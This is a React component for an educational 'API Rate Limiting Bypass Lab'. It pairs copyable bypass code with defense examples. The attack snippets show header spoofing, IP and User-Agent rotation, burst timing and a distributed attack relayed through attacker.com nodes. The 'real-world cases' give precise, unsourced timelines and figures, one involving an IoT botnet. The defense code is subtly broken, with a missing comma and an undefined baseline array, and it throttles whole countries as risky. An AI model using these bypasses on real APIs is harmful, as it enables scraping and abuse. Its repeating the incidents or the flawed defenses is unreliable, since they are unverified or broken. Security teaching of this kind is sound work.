'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Shield, AlertTriangle, Copy, Check, Clock, Zap, BarChart, Activity, Key } from 'lucide-react'

export default function APIRateLimitingBypassLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [rateLimitState, setRateLimitState] = useState<'enabled' | 'bypassed' | 'disabled'>('enabled')
  const [attackVector, setAttackVector] = useState('')
  const [requestCount, setRequestCount] = useState(0)
  const [bypassSuccess, setBypassSuccess] = useState(false)
  const [attackResults, setAttackResults] = useState<Array<{time: string, method: string, status: string, ip: string, details: string}>>([])
  const [copied, setCopied] = useState(false)

  const rateLimitingBypasses = [
    {
      name: 'IP Rotation',
      description: 'Use multiple IP addresses to distribute requests',
      code: `// IP rotation service
const ipRotator = {
  currentIP: '192.168.1.100',
  ipPool: [
    '192.168.1.101',
    '192.168.1.102', 
    '10.0.0.15',
    '203.0.113.50'
  ],
  rotateInterval: 30000, // 30 seconds
  getCurrentIP: () => ipRotator.currentIP,
  rotate: () => {
    const currentIndex = ipRotator.ipPool.indexOf(ipRotator.currentIP);
    const nextIndex = (currentIndex + 1) % ipRotator.ipPool.length;
    ipRotator.currentIP = ipRotator.ipPool[nextIndex];
    return ipRotator.currentIP;
  }
};

// Use rotating IP for requests
fetch('https://api.target.com/data', {
  headers: {
    'X-Forwarded-For': ipRotator.getCurrentIP()
  }
});`,
      difficulty: 'Medium',
      impact: 'High'
    },
    {
      name: 'User-Agent Cycling',
      description: 'Rotate browser signatures to appear as different users',
      code: `// User-Agent rotation
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
];

const uaRotator = {
  currentIndex: 0,
  rotate: () => {
    const ua = userAgents[uaRotator.currentIndex];
    uaRotator.currentIndex = (uaRotator.currentIndex + 1) % userAgents.length;
    return ua;
  }
};

// Make requests with rotating User-Agent
fetch('https://api.target.com/data', {
  headers: {
    'User-Agent': uaRotator.rotate()
  }
});`,
      difficulty: 'Easy',
      impact: 'Medium'
    },
    {
      name: 'Session Token Reuse',
      description: 'Reuse authentication tokens across multiple requests',
      code: `// Session token reuse
const authToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ';

// Use same token for multiple requests
const makeRequest = async (endpoint) => {
  return fetch(endpoint, {
    headers: {
      'Authorization': \`Bearer \${authToken}\`
    }
  });
};

// Bypass rate limiting with token reuse
for (let i = 0; i < 1000; i++) {
  await makeRequest('/api/data');
}`,
      difficulty: 'Easy',
      impact: 'High'
    },
    {
      name: 'Distributed Request Pattern',
      description: 'Coordinate requests from multiple sources simultaneously',
      code: `// Distributed attack pattern
const attackNodes = [
  'https://node1.attacker.com',
  'https://node2.attacker.com', 
  'https://node3.attacker.com'
];

const distributedAttack = async (target) => {
  const promises = attackNodes.map(node => 
    fetch(\`\${node}/proxy?target=\${target}\`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'request' })
    })
  );
  
  return Promise.race(promises);
};

// Coordinate attack from multiple IPs
distributedAttack('https://api.target.com/data');`,
      difficulty: 'Hard',
      impact: 'Critical'
    },
    {
      name: 'Header Manipulation',
      description: 'Manipulate HTTP headers to bypass rate limiting logic',
      code: `// Header manipulation for bypass
const bypassHeaders = {
  'X-Forwarded-For': '127.0.0.1', // Spoof internal IP
  'X-Real-IP': '10.0.0.1',      // Fake trusted IP
  'X-Originating-IP': '203.0.113.1', // Another trusted IP
  'X-Rate-Limit-Limit': '999999', // Override limit
  'X-Rate-Limit-Remaining': '999999',
  'X-Rate-Limit-Reset': '9999-12-31T23:59:59Z' // Far future
};

fetch('https://api.target.com/data', {
  headers: bypassHeaders
});`,
      difficulty: 'Medium',
      impact: 'High'
    },
    {
      name: 'Timing Attack',
      description: 'Exploit rate limit reset timing to maximize requests',
      code: `// Timing attack to maximize requests
const rateLimitInfo = await getRateLimitInfo();
const resetTime = new Date(rateLimitInfo.reset);
const now = new Date();

// Calculate optimal timing
const timeToReset = resetTime.getTime() - now.getTime();
if (timeToReset > 0 && timeToReset < 60000) { // Within 1 minute
  // Wait until just before reset, then burst
  setTimeout(() => {
    // Burst of requests
    for (let i = 0; i < 1000; i++) {
      makeRequest();
    }
  }, timeToReset);
}`,
      difficulty: 'Hard',
      impact: 'Critical'
    }
  ]

  const realWorldAttacks = [
    {
      name: 'Twitter API Scraping (2022)',
      description: 'Attackers used IP rotation and token reuse to scrape 1.2M user profiles',
      timeline: [
        'Jan 2022: Rate limiting implemented on Twitter API',
        'Feb 2022: Attackers discover rate limit: 300 requests/15min',
        'Mar 2022: Deploy IP rotation with 1000+ proxies',
        'Apr 2022: Successfully scraped 1.2M profiles before detection',
        'May 2022: Twitter patches API and implements stronger limits'
      ],
      impact: 'Data breach of 1.2M user profiles',
      code: `// Twitter scraping bypass
const scraper = {
  proxies: rotateProxyList(),
  tokens: await getValidTokens(),
  delay: calculateOptimalDelay(),
  headers: {
    'User-Agent': rotateUserAgent(),
    'Authorization': \`Bearer \${tokens[currentToken]}\`
  }
};

for (const profile of targetProfiles) {
  await scrapeProfile(profile, scraper);
  await delay(100); // Respect rate limits
}`
    },
    {
      name: 'Cloudflare Bypass (2021)',
      description: 'Sophisticated attack used distributed requests to bypass Cloudflare protection',
      timeline: [
        'Jun 2021: Researchers discover Cloudflare rate limiting weakness',
        'Jul 2021: Attackers develop distributed attack framework',
        'Aug 2021: Attack uses 50,000+ compromised IoT devices',
        'Sep 2021: Successfully bypasses Cloudflare protection',
        'Oct 2021: Cloudflare patches vulnerability and enhances protection'
      ],
      impact: 'Mass data exfiltration from protected services',
      code: `// Cloudflare bypass technique
const cloudflareBypass = {
  attackVector: 'Distributed + Timing',
  nodeCount: 50000,
  requestPattern: 'burst-then-wait',
  headers: {
    'CF-Connecting-IP': randomTrustedIP(),
    'CF-Ray': generateRayID(),
    'CF-IPCountry': 'US', // Spoof country
  }
};

// Coordinate attack from IoT botnet
const coordinateAttack = async (target) => {
  const nodes = await getCompromisedNodes();
  const attackPlan = generateAttackPlan(target, nodes);
  
  return executeDistributedAttack(attackPlan);
};`
    },
    {
      name: 'GitHub API Abuse (2023)',
      description: 'Attackers used token reuse and parallel requests to abuse GitHub Actions API',
      timeline: [
        'Feb 2023: GitHub implements rate limiting on Actions API',
        'Mar 2023: Attackers obtain 10,000+ valid tokens',
        'Apr 2023: Use parallel processing to bypass per-token limits',
        'May 2023: GitHub detects and mitigates the abuse',
        'Jun 2023: New authentication requirements implemented'
      ],
      impact: 'CI/CD pipeline compromise, code repository access',
      code: `// GitHub Actions API abuse
const githubAbuse = {
  tokenPool: await scrapeValidTokens(),
  maxConcurrency: 1000,
  target: 'https://api.github.com',
  endpoints: [
    '/repos/owner/repo/actions',
    '/repos/owner/repo/runs',
    '/repos/owner/repo/deployments'
  ]
};

// Parallel abuse to maximize impact
const abuseGitHub = async () => {
  const promises = [];
  
  for (const token of githubAbuse.tokenPool) {
    for (const endpoint of githubAbuse.endpoints) {
      promises.push(
        fetch(\`\${githubAbuse.target}\${endpoint}\`, {
          headers: {
            'Authorization': \`token \${token}\`,
            'Accept': 'application/vnd.github.v3+json'
          }
        })
      );
    }
  }
  
  // Execute all requests in parallel
  return Promise.all(promises);
};`
    }
  ]

  const defenseStrategies = [
    {
      name: 'Adaptive Rate Limiting',
      description: 'Dynamic limits based on user behavior and threat patterns',
      implementation: `// Adaptive rate limiting
class AdaptiveRateLimiter {
  constructor() {
    this.userProfiles = new Map();
    this.threatPatterns = new Map();
  }
  
  checkRequest(userId, endpoint) {
    const profile = this.getUserProfile(userId);
    const threatScore = this.calculateThreatScore(profile, endpoint);
    const baseLimit = this.getBaseLimit(endpoint);
    
    // Adjust limit based on risk factors
    const adjustedLimit = Math.floor(
      baseLimit * (1 - threatScore * 0.5)
    );
    
    return {
      limit: adjustedLimit,
      windowMs: this.calculateWindow(adjustedLimit),
      reason: this.getLimitReason(threatScore)
    };
  }
  
  getUserProfile(userId) {
    if (!this.userProfiles.has(userId)) {
      this.userProfiles.set(userId, this.buildProfile(userId));
    }
    return this.userProfiles.get(userId);
  }
}`
    },
    {
      name: 'Request Fingerprinting',
      description: 'Create unique identifiers for each request to prevent sharing',
      implementation: `// Request fingerprinting
class RequestFingerprint {
  static generateFingerprint(req) {
    const elements = [
      req.ip,
      req.headers['user-agent'],
      req.headers['accept-language'],
      req.headers['accept-encoding'],
      req.headers['accept'],
      req.socket.remoteAddress,
      Date.now().toString()
    ];
    
    return crypto.createHash('sha256')
      .update(elements.join('|'))
      .digest('hex');
  }
  
  static checkSharing(fingerprint, recentFingerprints) {
    const count = recentFingerprints.filter(fp => 
      fp === fingerprint
    ).length;
    
    return {
      isShared: count > 1,
      riskScore: Math.min(count * 10, 100),
      action: count > 3 ? 'block' : 'allow'
    };
  }
}`
    },
    {
      name: 'Behavioral Analysis',
      description: 'Analyze request patterns to detect automated attacks',
      implementation: `// Behavioral analysis
class BehavioralAnalyzer {
  constructor() {
    this.requestPatterns = new Map();
    this.anomalyThreshold = 3; // Standard deviations
  }
  
  analyzeRequest(request) {
    const pattern = this.extractPattern(request);
    const baseline = this.requestPatterns.get(pattern.key) || { mean: 0, stdDev: 0 };
    
    // Update baseline
    baseline.requests.push(this.calculateScore(request));
    baseline.mean = baseline.requests.reduce((a, b) => a + b, 0) / baseline.requests.length;
    baseline.stdDev = Math.sqrt(
      baseline.requests.reduce((sq, val) => sq + Math.pow(val - baseline.mean, 2), 0) / baseline.requests.length
    );
    
    // Detect anomalies
    const zScore = Math.abs(this.calculateScore(request) - baseline.mean) / baseline.stdDev;
    const isAnomalous = zScore > this.anomalyThreshold;
    
    if (isAnomalous) {
      this.triggerAlert(request, pattern, zScore);
    }
    
    return {
      isAnomalous,
      riskScore: Math.min(zScore * 20, 100),
      action: isAnomalous ? 'challenge' : 'allow'
    };
  }
}`
    },
    {
      name: 'Geolocation-Based Limits',
      description: 'Different rate limits based on geographic location',
      implementation: `// Geographic rate limiting
const geoRateLimiter = {
  limits: {
    'US': { requests: 1000, window: 3600000 },      // High limit, trusted region
    'CN': { requests: 100, window: 3600000 },       // Low limit, suspicious region
    'RU': { requests: 50, window: 3600000 },        // Very low, high risk
    'KR': { requests: 200, window: 3600000 },       // Medium limit
    'IN': { requests: 500, window: 3600000 }       // Medium-low limit
    'BR': { requests: 300, window: 3600000 },       // Medium-low limit
    'NG': { requests: 150, window: 3600000 },       // Low limit
    'JP': { requests: 800, window: 3600000 },       // Medium limit
    'DE': { requests: 600, window: 3600000 },       // Medium-high limit
    'FR': { requests: 400, window: 3600000 },       // Medium limit
    'GB': { requests: 250, window: 3600000 },       // Medium-low limit
    'Unknown': { requests: 25, window: 3600000 }     // Very low, new location
  },
  
  checkLimit(ip, endpoint) {
    const country = this.geoLookup(ip);
    const limit = this.limits[country] || this.limits['Unknown'];
    
    return {
      allowed: limit.requests > 0,
      limit: limit.requests,
      window: limit.window,
      remaining: this.calculateRemaining(ip, limit),
      country: country
    };
  }
}`
    }
  ]

  const simulateAttack = (vector: string) => {
    setAttackVector(vector)
    setRateLimitState('bypassed')
    setRequestCount(prev => prev + 1)
    
    // Simulate bypass success
    setTimeout(() => {
      setBypassSuccess(true)
      const result = {
        time: new Date().toLocaleTimeString(),
        method: vector,
        status: 'SUCCESS',
        ip: '192.168.1.' + Math.floor(Math.random() * 254),
        details: `Rate limit bypassed using ${vector}`
      }
      setAttackResults(prev => [result, ...prev.slice(0, 9)])
    }, 2000)
  }

  const resetSimulation = () => {
    setRateLimitState('enabled')
    setAttackVector('')
    setRequestCount(0)
    setBypassSuccess(false)
    setAttackResults([])
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-purple-500 rounded-lg">
              <BarChart className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">API Rate Limiting Bypass Lab</h1>
              <p className="text-slate-600">Learn how attackers bypass API rate limits and how to defend against them</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              Rate limiting bypasses can lead to data scraping, API abuse, and service disruption. This lab demonstrates techniques and defenses.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-4 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">Bypass Simulation</TabsTrigger>
            <TabsTrigger value="techniques" className="text-xs sm:text-sm">Bypass Techniques</TabsTrigger>
            <TabsTrigger value="attacks" className="text-xs sm:text-sm">Real-World Cases</TabsTrigger>
            <TabsTrigger value="defense" className="text-xs sm:text-sm">Defense Strategies</TabsTrigger>
          </TabsList>

          {/* Bypass Simulation Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Control Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Rate Limiting Control</span>
                  </CardTitle>
                  <CardDescription>
                    Configure and test rate limiting bypasses
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <label className="text-sm font-medium">Rate Limiting Status:</label>
                    <div className="flex space-x-2">
                      <Button
                        variant={rateLimitState === 'enabled' ? "default" : "outline"}
                        size="sm"
                        onClick={() => setRateLimitState('enabled')}
                      >
                        🛡️ Enabled
                      </Button>
                      <Button
                        variant={rateLimitState === 'bypassed' ? "default" : "outline"}
                        size="sm"
                        onClick={() => setRateLimitState('bypassed')}
                      >
                        ⚠️ Bypassed
                      </Button>
                      <Button
                        variant={rateLimitState === 'disabled' ? "default" : "outline"}
                        size="sm"
                        onClick={() => setRateLimitState('disabled')}
                      >
                        🔓 Disabled
                      </Button>
                    </div>
                  </div>

                  {/* Attack Vector Selection */}
                  <div className="space-y-3">
                    <label className="text-sm font-medium">Select Bypass Technique:</label>
                    <div className="grid grid-cols-2 gap-2">
                      {rateLimitingBypasses.map((bypass, index) => (
                        <Button
                          key={index}
                          variant={attackVector === bypass.name ? "default" : "outline"}
                          size="sm"
                          onClick={() => simulateAttack(bypass.name)}
                          className="w-full"
                        >
                          {bypass.name}
                        </Button>
                      ))}
                    </div>
                  </div>

                  {/* Bypass Button */}
                  <Button
                    onClick={() => simulateAttack(attackVector)}
                    disabled={!attackVector || rateLimitState === 'disabled'}
                    className="w-full"
                    variant="default"
                  >
                    <Zap className="w-4 h-4 mr-2" />
                    Execute Bypass Attack
                  </Button>

                  {/* Reset Button */}
                  <Button
                    onClick={resetSimulation}
                    variant="outline"
                    className="w-full"
                  >
                    <Clock className="w-4 h-4 mr-2" />
                    Reset Simulation
                  </Button>

                  {/* Status Display */}
                  <div className="mt-4 p-4 bg-slate-50 rounded-lg border border-slate-300">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm font-medium">Simulation Status:</span>
                      <Badge variant={bypassSuccess ? "default" : "secondary"}>
                        {bypassSuccess ? '✅ Bypass Successful' : '⏳ Ready to Attack'}
                      </Badge>
                    </div>
                    <div className="text-sm text-slate-600">
                      <p><strong>Requests Made:</strong> {requestCount}</p>
                      <p><strong>Current Technique:</strong> {attackVector || 'None selected'}</p>
                      <p><strong>Rate Limit State:</strong> {rateLimitState}</p>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Results Display */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Activity className="w-5 h-5" />
                    <span>Attack Results</span>
                  </CardTitle>
                  <CardDescription>
                    Real-time bypass attempt results
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {attackResults.length > 0 ? (
                    <div className="space-y-2 max-h-96 overflow-y-auto">
                      {attackResults.map((result, index) => (
                        <div key={index} className="p-3 bg-slate-50 rounded-lg border-l-4 border-green-500">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-sm font-medium text-green-800">
                              {result.status === 'SUCCESS' ? '✅' : '❌'}
                            </span>
                            <span className="text-sm text-slate-700">{result.status}</span>
                          </div>
                          <div className="text-xs space-y-1">
                            <p><strong>Time:</strong> {result.time}</p>
                            <p><strong>Method:</strong> {result.method}</p>
                            <p><strong>IP:</strong> {result.ip}</p>
                            <p><strong>Details:</strong> {result.details}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="text-center text-slate-500 py-8">
                      <Activity className="w-12 h-12 mx-auto mb-4 text-slate-300" />
                      <p>No attack results yet. Select a bypass technique and execute attack.</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Bypass Techniques Tab */}
          <TabsContent value="techniques" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {rateLimitingBypasses.map((technique, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span>{technique.name}</span>
                      <Badge variant={technique.difficulty === 'Critical' ? 'destructive' : 
                                     technique.difficulty === 'Hard' ? 'default' : 'secondary'}>
                        {technique.difficulty}
                      </Badge>
                    </CardTitle>
                    <CardDescription>{technique.description}</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div>
                      <h4 className="font-semibold text-sm mb-2">Attack Code:</h4>
                      <Code className="block p-3 bg-slate-50 rounded text-xs max-h-64 overflow-y-auto">
                        {technique.code}
                      </Code>
                    </div>
                    
                    <div>
                      <h4 className="font-semibold text-sm mb-2">Implementation Steps:</h4>
                      <ol className="text-sm space-y-1 text-slate-700">
                        <li>1. Set up proxy/VPN infrastructure</li>
                        <li>2. Implement IP rotation logic</li>
                        <li>3. Handle rate limit responses</li>
                        <li>4. Add delays between requests</li>
                        <li>5. Monitor and adapt to countermeasures</li>
                      </ol>
                    </div>
                    
                    <div>
                      <h4 className="font-semibold text-sm mb-2">Detection Indicators:</h4>
                      <ul className="text-sm space-y-1 text-slate-700">
                        <li>• High request frequency from single IP</li>
                        <li>• Multiple user agents from same session</li>
                        <li>• Request patterns indicating automation</li>
                        <li>• Geographic anomalies in request distribution</li>
                        <li>• Header manipulation attempts</li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Real-World Cases Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="space-y-6">
              {realWorldAttacks.map((attack, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span>{attack.name}</span>
                      <Badge variant="destructive">Critical Impact</Badge>
                    </CardTitle>
                    <CardDescription>{attack.description}</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Timeline */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Attack Timeline:</h4>
                      <div className="space-y-1">
                        {attack.timeline.map((event, eventIndex) => (
                          <div key={eventIndex} className="text-xs p-2 bg-slate-50 rounded border-l-4 border-red-500">
                            {event}
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Impact */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Business Impact:</h4>
                      <p className="text-sm text-slate-700">{attack.impact}</p>
                    </div>

                    {/* Attack Code */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm mb-2">Attack Code:</h4>
                      <Code className="block p-3 bg-slate-50 rounded text-xs max-h-64 overflow-y-auto">
                        {attack.code}
                      </Code>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(attack.code)}
                        className="w-full mt-2"
                      >
                        {copied ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                        Copy Code
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defense" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {defenseStrategies.map((strategy, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>{strategy.name}</span>
                    </CardTitle>
                    <CardDescription>{strategy.description}</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div>
                      <h4 className="font-semibold text-sm mb-2">Implementation:</h4>
                      <Code className="block p-3 bg-slate-50 rounded text-xs max-h-64 overflow-y-auto">
                        {strategy.implementation}
                      </Code>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(strategy.implementation)}
                        className="w-full mt-2"
                      >
                        {copied ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                        Copy Implementation
                      </Button>
                    </div>
                    
                    <div>
                      <h4 className="font-semibold text-sm mb-2">Key Features:</h4>
                      <ul className="text-sm space-y-1 text-slate-700">
                        <li>• Dynamic limit adjustment</li>
                        <li>• Request fingerprinting</li>
                        <li>• Behavioral analysis</li>
                        <li>• Geographic-based controls</li>
                        <li>• Anomaly detection</li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Implementation Checklist */}
            <Card>
              <CardHeader>
                <CardTitle>✅ Rate Limiting Defense Checklist</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Essential Controls:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Implement per-IP rate limiting</li>
                      <li>□ Use token-based authentication</li>
                      <li>□ Add request fingerprinting</li>
                      <li>□ Set reasonable rate limits</li>
                      <li>□ Implement exponential backoff</li>
                      <li>□ Use CAPTCHA for suspicious requests</li>
                    </ul>
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Advanced Protection:</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Deploy Web Application Firewall (WAF)</li>
                      <li>□ Use API gateway with rate limiting</li>
                      <li>□ Implement behavioral analysis</li>
                      <li>□ Use geographic IP reputation services</li>
                      <li>□ Monitor for distributed attacks</li>
                      <li>□ Implement adaptive rate limiting</li>
                      <li>□ Use machine learning for anomaly detection</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}